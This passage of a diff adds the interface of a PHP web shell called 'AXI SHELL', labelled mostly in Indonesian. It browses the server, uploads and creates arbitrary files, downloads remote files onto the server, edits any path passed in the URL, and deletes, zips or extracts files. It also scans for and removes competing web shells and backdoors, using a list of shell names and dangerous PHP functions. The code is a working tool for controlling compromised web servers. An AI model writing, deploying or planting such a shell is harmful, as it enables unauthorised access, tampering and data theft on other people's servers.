+    if($c=="") return '<a href="?path=/">/</a>';
+    $exp=explode("/",$c);
+    $b="";
+    $r='<a href="?path=/">/</a> ';
+    foreach($exp as $x){
+        if(!$x)continue;
+        $b.="/$x";
+        $r.='/ <a href="?path='.urlencode($b).'">'.$x.'</a> ';
+    }
+    return $r;
+}
+
+?>
+<!DOCTYPE html>
+<html>
+<head>
+<link rel="icon" href="https://ik.imagekit.io/axi/axi2.png">
+<title>AXI SHELL</title>
+<style>
+body{background:#111;color:#eee;font-family:Arial;padding:20px;border:1px solid #ff0000}
+a{text-decoration:none;color:#00d0ff}
+a:hover{color:#55e8ff}
+
+table{width:100%;border-collapse:collapse;margin-top:20px;border:1px solid #ff0000}
+td,th{padding:10px;border:1px solid #ff0000}
+
+.action-row{display:flex;gap:15px;margin-top:10px;flex-wrap:wrap}
+.action-box{flex:1;min-width:220px;border:1px solid #ff0000;background:#181818;padding:10px;border-radius:5px}
+button{padding:6px 12px;background:#ff4444;border:0;color:#fff;border-radius:5px;cursor:pointer}
+
+.alert-success{background:#002800;color:#00ff6a;border-left:4px solid #00ff6a;padding:8px;margin-top:8px}
+.alert-error{background:#280000;color:#ff4444;border-left:4px solid #ff4444;padding:8px;margin-top:8px}
+.alert-warning{background:#282800;color:#ffff44;border-left:4px solid #ffff00;padding:8px;margin-top:8px}
+.alert-info{background:#002828;color:#00ffff;border-left:4px solid #00ffff;padding:8px;margin-top:8px}
+
+.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.75);display:flex;justify-content:center;align-items:center;z-index:9999}
+.modal-box{background:#111;border:1px solid #ff0000;border-radius:6px;padding:15px;width:90%;max-width:1000px}
+
+.not-editable{color:#ccc !important;cursor:not-allowed;}
+.lock-icon{color:#ff4444;margin-right:4px;}
+
+/* Style untuk hasil scan */
+.risk-high{background:#280000 !important;color:#ff4444 !important;}
+.risk-medium{background:#282800 !important;color:#ffff44 !important;}
+.risk-low{background:#002800 !important;color:#00ff6a !important;}
+.scan-result-table th, .scan-result-table td {border:1px solid #444 !important;padding:8px !important;}
+.scan-header {background:#222 !important; font-weight:bold;}
+</style>
+
+<script>
+function renameBox(f){ var e=document.getElementById("rn_"+f); if(e)e.style.display="block"; }
+function toggle(s){ document.querySelectorAll('[name="selected[]"]').forEach(x=>x.checked=s.checked); }
+function closeEdit(){ let m=document.getElementById("editModal"); if(m)m.remove(); }
+function toggleScanResults(){
+    let e=document.getElementById("scanResults");
+    if(e) e.style.display = e.style.display === 'none' ? 'block' : 'none';
+}
+function showScanDetails(index) {
+    let details = document.getElementById('scan-details-' + index);
+    if (details) details.style.display = details.style.display === 'none' ? 'block' : 'none';
+}
+</script>
+</head>
+<body>
+
+<div style="display:flex;justify-content:space-between;align-items:center">
+    <h2>AXI SHELL</h2>
+    <img src="<?php echo $logo_url; ?>" height="55">
+</div>
+
+<p><b>Current Path:</b> <?php echo makeBreadcrumb($real); ?></p>
+
+<!-- TAMPILAN STATUS SCAN -->
+<?php if($scanStatus == "found"): ?>
+<div class="alert-warning">
+    ⚠ <b>Ditemukan <?php echo count($scanResults); ?> file/direktori mencurigakan!</b>
+    <button onclick="toggleScanResults()" style="margin-left:10px;background:#ffff00;color:#000;padding:3px 8px;font-size:12px">
+        Tampilkan/Sembunyikan Hasil
+    </button>
+    <?php if(isset($scanTime)): ?>
+    <span style="margin-left:10px;font-size:12px">(Waktu scan: <?php echo $scanTime; ?> detik)</span>
+    <?php endif; ?>
+</div>
+<?php elseif($scanStatus == "clean"): ?>
+<div class="alert-success">
+    ✔ <b>Scan selesai. Tidak ditemukan file mencurigakan.</b>
+    <?php if(isset($scanTime)): ?>
+    <span style="margin-left:10px;font-size:12px">(Waktu scan: <?php echo $scanTime; ?> detik)</span>
+    <?php endif; ?>
+</div>
+<?php elseif($scanStatus == "deleted"): ?>
+<div class="alert-success">
+    ✔ <b>File berhasil dihapus. Halaman akan direfresh...</b>
+</div>
+<?php elseif($scanStatus == "delete_error"): ?>
+<div class="alert-error">
+    ✖ <b>Gagal menghapus file.</b>
+</div>
+<?php endif; ?>
+
+<div class="action-row">
+
+    <div class="action-box">
+        <h3>1. Upload</h3>
+        <form method="post" enctype="multipart/form-data">
+            <input type="file" name="file[]" multiple>
+            <button type="submit" name="upload">Upload</button>
+        </form>
+        <?php if($uploadStatus==="success"): ?>
+        <div class="alert-success">✔ Upload berhasil</div>
+        <?php elseif($uploadStatus==="error"): ?>
+        <div class="alert-error">✖ Upload gagal</div>
+        <?php endif; ?>
+    </div>
+
+    <div class="action-box">
+        <h3>2. Create Folder</h3>
+        <form method="post">
+            <input name="foldername">
+            <button type="submit" name="newfolder">Create</button>
+        </form>
+        <?php if($folderStatus==="success"): ?>
+        <div class="alert-success">✔ Folder created</div>
+        <?php elseif($folderStatus==="error"): ?>
+        <div class="alert-error">✖ Create failed</div>
+        <?php endif; ?>
+    </div>
+
+    <div class="action-box">
+        <h3>3. Create File</h3>
+        <button type="button" onclick="document.getElementById('createFileModal').style.display='flex'">Create File</button>
+    </div>
+
+    <div class="action-box">
+        <h3>4. COMAD</h3>
+        <form method="post">
+            <input name="fileurl" placeholder="https://...">
+            <input name="saveas" placeholder="nama.ext">
+            <button type="submit" name="comad">Fetch</button>
+        </form>
+        <?php if($comadStatus==="success"): ?>
+        <div class="alert-success">✔ File fetched</div>
+        <?php elseif($comadStatus==="error"): ?>
+        <div class="alert-error">✖ Fetch failed</div>
+        <?php endif; ?>
+    </div>
+
+    <!-- MENU SCAN BARU -->
+    <div class="action-box">
+        <h3 style="color:#ff4444">5. Scan Sensitive Files</h3>
+        <p style="font-size:12px;color:#aaa;margin:5px 0">Scan webshell, file manager, backdoor</p>
+        <form method="post">
+            <button type="submit" name="scan_files" style="background:#ff4444;width:100%">
+                🔍 Start Scanning
+            </button>
+        </form>
+        <p style="font-size:10px;color:#888;margin-top:5px">
+            Akan scan: .php, .phtml, config files, dll.
+        </p>
+    </div>
+
+</div>
+
+<!-- HASIL SCAN (DISEMBUNYIKAN AWALNYA) -->
+<?php if(!empty($scanResults)): ?>
+<div id="scanResults" style="display:block; margin-top:20px;">
+    <h3 style="color:#ff4444">📊 Hasil Scanning File Sensitif</h3>
+    <p style="font-size:12px;color:#aaa;">Total ditemukan: <?php echo count($scanResults); ?> item</p>
+
+    <table class="scan-result-table">
+        <tr class="scan-header">
+            <th>Nama File</th>
+            <th>Tipe</th>
+            <th>Ukuran</th>
+            <th>Modified</th>
+            <th>Risk Level</th>
+            <th>Deteksi</th>
+            <th>Aksi</th>
+        </tr>
+        <?php foreach($scanResults as $index => $result): ?>
+        <tr class="risk-<?php echo strtolower($result['risk_level']); ?>">
+            <td>
+                <strong><?php echo htmlspecialchars($result['name']); ?></strong><br>
+                <small style="color:#aaa; font-size:11px;"><?php echo htmlspecialchars($result['path']); ?></small>
+                <button onclick="showScanDetails(<?php echo $index; ?>)"
+                        style="margin-left:5px;background:transparent;border:1px solid #666;color:#aaa;padding:1px 5px;font-size:10px;cursor:pointer">
+                    Details
+                </button>
+            </td>
+            <td><?php echo $result['type']; ?></td>
+            <td><?php echo $result['size']; ?></td>
+            <td><?php echo $result['modified']; ?></td>
+            <td><b><?php echo $result['risk_level']; ?></b></td>
+            <td>
+                <?php if($result['name_suspicious']): ?>
+                <span style="color:#ff4444">Nama</span>
+                <?php endif; ?>
+                <?php if($result['content_suspicious']): ?>
+                <?php if($result['name_suspicious']) echo '+'; ?>
+                <span style="color:#ff8800">Konten</span>
+                <?php endif; ?>
+            </td>
+            <td>
+                <?php if($result['type'] == 'File'): ?>
+                <form method="post" style="display:inline;">
+                    <input type="hidden" name="scan_file_path" value="<?php echo htmlspecialchars($result['full_path']); ?>">
+                    <button type="submit" name="delete_scan_result"
+                            onclick="return confirm('Hapus file ini?\n<?php echo addslashes($result['path']); ?>')"
+                            style="background:#ff0000;padding:3px 8px;font-size:12px;margin:2px">
+                        Hapus
+                    </button>
+                </form>
+                <a href="?path=<?php echo urlencode(dirname($result['full_path'])); ?>&edit=<?php echo urlencode($result['full_path']); ?>"
+                   style="background:#00d0ff;color:#000;padding:3px 8px;font-size:12px;border-radius:3px;margin:2px;display:inline-block">
+                    Edit
+                </a>
+                <?php else: ?>
+                <a href="?path=<?php echo urlencode($result['full_path']); ?>"
+                   style="background:#444;color:#fff;padding:3px 8px;font-size:12px;border-radius:3px;margin:2px;display:inline-block">
+                    Buka
+                </a>
+                <?php endif; ?>
+            </td>
+        </tr>
+        <!-- Detail tambahan untuk setiap hasil scan -->
+        <tr id="scan-details-<?php echo $index; ?>" style="display:none;background:#1a1a1a;">
+            <td colspan="7" style="padding:10px;">
+                <div style="font-size:12px;">
+                    <strong>Detail Deteksi:</strong><br>
+                    <?php if($result['name_suspicious']): ?>
+                    • <span style="color:#ff4444">Nama mencurigakan:</span> Cocok dengan pola <?php echo htmlspecialchars($result['matched_pattern']); ?><br>
+                    <?php endif; ?>
+                    <?php if($result['content_suspicious'] && !empty($result['found_keywords'])): ?>
+                    • <span style="color:#ff8800">Keyword ditemukan:</span>
+                    <?php echo implode(', ', array_slice($result['found_keywords'], 0, 5)); ?>
+                    <?php if(count($result['found_keywords']) > 5): ?>... (total: <?php echo count($result['found_keywords']); ?>)<?php endif; ?>
+                    <br>
+                    <?php endif; ?>
+                    • <span style="color:#00aaff">Path lengkap:</span> <?php echo htmlspecialchars($result['full_path']); ?>
+                </div>
+            </td>
+        </tr>
+        <?php endforeach; ?>
+    </table>
+
+    <div style="margin-top:15px;padding:10px;background:#181818;border:1px solid #444;">
+        <h4>📝 Informasi Deteksi:</h4>
+        <ul style="font-size:12px;color:#aaa;">
+            <li><b style="color:#ff4444">Deteksi Nama File:</b> shell.php, c99.php, r57.php, wso.php, backdoor, filemanager, admin, config, upload, dll.</li>
+            <li><b style="color:#ff8800">Deteksi Konten:</b> eval(), base64_decode(), shell_exec(), system(), exec(), phpinfo(), dll.</li>
+            <li><b>Level Risiko:</b>
+                <span style="color:#ff4444">HIGH</span> (nama+konten),
+                <span style="color:#ffff44">MEDIUM</span> (nama saja),
+                <span style="color:#00ff6a">LOW</span> (konten saja).
+            </li>
+            <li>File yang discan: .php, .phtml, .html, .js, .txt, .config, dan file teks lainnya (maks 10MB).</li>
+        </ul>
+    </div>
+</div>
+<?php endif; ?>
+
+<!-- =============================== -->
+<!--  CREATE FILE MODAL (FINAL FIX) -->
+<!-- =============================== -->
+<div id="createFileModal" class="modal-overlay" style="display:none">
+    <div class="modal-box">
+        <h3 style="color:#00d0ff">Create New File</h3>
+
+        <form method="post">
+            <input type="hidden" name="createfile_confirm" value="1">
+
+            <p>Filename:</p>
+            <input name="newfilename" style="width:100%;padding:8px;background:#000;color:#0f0;border:1px solid #ff0000" placeholder="example.php">
+
+            <p style="margin-top:10px">File Content:</p>
+            <textarea name="newfilecontent" style="width:100%;height:300px;background:#000;color:#0f0;border:1px solid #ff0000" placeholder="&lt;?php echo 'Hello World'; ?&gt;"></textarea>
+
+            <div style="text-align:right;margin-top:10px">
+                <button type="submit" style="background:#00d0ff;color:#000">Create</button>
+                <button type="button" onclick="document.getElementById('createFileModal').style.display='none'" style="background:#ff0000">Cancel</button>
+            </div>
+        </form>
+    </div>
+</div>
+<!-- END MODAL -->
+
+<form method="post" style="margin-top:20px">
+
+<button type="submit" name="delete_selected" onclick="return confirm('Delete selected?')">Delete Selected</button>
+
+<input type="text" name="zip_name" placeholder="selected-YYYYMMDD-HHMMSS.zip" style="margin-left:10px;padding:6px 8px;">
+<button type="submit" name="zip_selected">ZIP Selected</button>
+
+<?php
+if($zipStatus==="success")  echo '<div class="alert-success">✔ ZIP created</div>';
+elseif($zipStatus==="error") echo '<div class="alert-error">✖ ZIP failed</div>';
+elseif($zipStatus==="nozip")echo '<div class="alert-error">✖ ZipArchive tidak tersedia</div>';
+
+if($extractStatus==="success")  echo '<div class="alert-success">✔ ZIP extracted</div>';
+elseif($extractStatus==="error") echo '<div class="alert-error">✖ Extract failed</div>';
+?>
+
+<table>
+<tr>
+    <th><input type="checkbox" onclick="toggle(this)"></th>
+    <th>Name</th>
+    <th>Size</th>
+    <th>Last Modified</th>
+    <th>Download</th>
+    <th>Rename</th>
+    <th>Delete</th>
+    <th>Extract</th>
+</tr>
+
+
+<?php
+$scan=scandir($path);
+$dirs=[];$files=[];
+foreach($scan as $f){
+    if($f=="."||$f=="..")continue;
+    is_dir("$path/$f") ? $dirs[]=$f : $files[]=$f;
+}
+sort($dirs); sort($files);
+$all=array_merge($dirs,$files);
+
+foreach($all as $f):
+$full="$path/$f";
+$isDir=is_dir($full);
+$size=$isDir?"-":round(@filesize($full)/1024,2)." KB";
+
+$isEditable = (!$isDir && is_writable($full));
+?>
+<tr>
+<td><input type="checkbox" name="selected[]" value="<?php echo htmlspecialchars($f); ?>"></td>
+
+<td>
+<?php
+$icon = $isDir
+    ? "📁"
+    : (preg_match('/\.(php|html|js|css)$/i', $f) ? "🖥️" : "📄");
+
+echo $icon . " ";
+?>
+
+<?php if($isDir): ?>
+
+    <a href="?path=<?php echo urlencode($full); ?>"><strong><?php echo htmlspecialchars($f); ?></strong></a>
+
+<?php else: ?>
+
+    <?php if($isEditable): ?>
+        <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($full); ?>">
+            <strong><?php echo htmlspecialchars($f); ?></strong>
+        </a>
+    <?php else: ?>
+        <span class="lock-icon">🔒</span>
+        <span class="not-editable"><strong><?php echo htmlspecialchars($f); ?></strong></span>
+    <?php endif; ?>
+
+<?php endif; ?>
+</td>
+
+<td><?php echo $size; ?></td>
+<td><?php echo date("Y-m-d H:i:s", @filemtime($full)); ?></td>
+
+
+<td>
+<?php
+echo $isDir
+? '-'
+: '<a href="?path='.urlencode($path).'&download='.urlencode($f).'">Download</a>';
+?>
+</td>
+
+<td>
+<a href="#" onclick="renameBox('<?php echo htmlspecialchars($f,ENT_QUOTES); ?>');return false;">Rename</a>
+<div id="rn_<?php echo htmlspecialchars($f,ENT_QUOTES); ?>" style="display:none;margin-top:5px">
+    <form method="post">
+        <input type="hidden" name="oldname" value="<?php echo htmlspecialchars($f); ?>">
+        <input name="newname" value="<?php echo htmlspecialchars($f); ?>">
+        <button type="submit" name="renamefile">OK</button>
+    </form>
+</div>
+</td>
+
+<td>
+<a href="?path=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($f); ?>" onclick="return confirm('Delete?')">Delete</a>
+</td>
+
+<td>
+<?php
+$ext=strtolower(pathinfo($f,PATHINFO_EXTENSION));
+echo (!$isDir && $ext=='zip')
+? '<a href="?path='.urlencode($path).'&extract='.urlencode($f).'" onclick="return confirm(\'Extract here?\')">Extract</a>'
+: '-';
+?>
+</td>
+
+</tr>
+<?php endforeach; ?>
+
+</table>
+</form>
+
+
+<?php if(isset($_GET['edit'])):
+$ef=$_GET['edit'];
+$content=htmlspecialchars(@file_get_contents($ef));
+?>
+<div id="editModal" class="modal-overlay"><div class="modal-box">
+
+<h3 style="color:#00d0ff">Editing: <?php echo htmlspecialchars($ef); ?></h3>
+
+<?php if($saveStatus==="success"): ?>
+<div class="alert-success">✔ File saved</div>
+<?php elseif($saveStatus==="error"): ?>
+<div class="alert-error">✖ Save failed</div>
+<?php endif; ?>
+
+<form method="post">
+<input type="hidden" name="filepath" value="<?php echo htmlspecialchars($ef); ?>">
+<textarea name="content" style="width:100%;height:70vh;background:#000;color:#0f0;border:1px solid #ff0000"><?php echo $content; ?></textarea>
+
+<div style="text-align:right;margin-top:8px">
+<button type="submit" name="savefile" style="background:#00d0ff;color:#000">Save</button>
+<button type="button" onclick="closeEdit()" style="background:#ff0000">Close</button>
+</div>
+
+</form>
+
+</div></div>
+<?php endif; ?>
+
+</body></html>
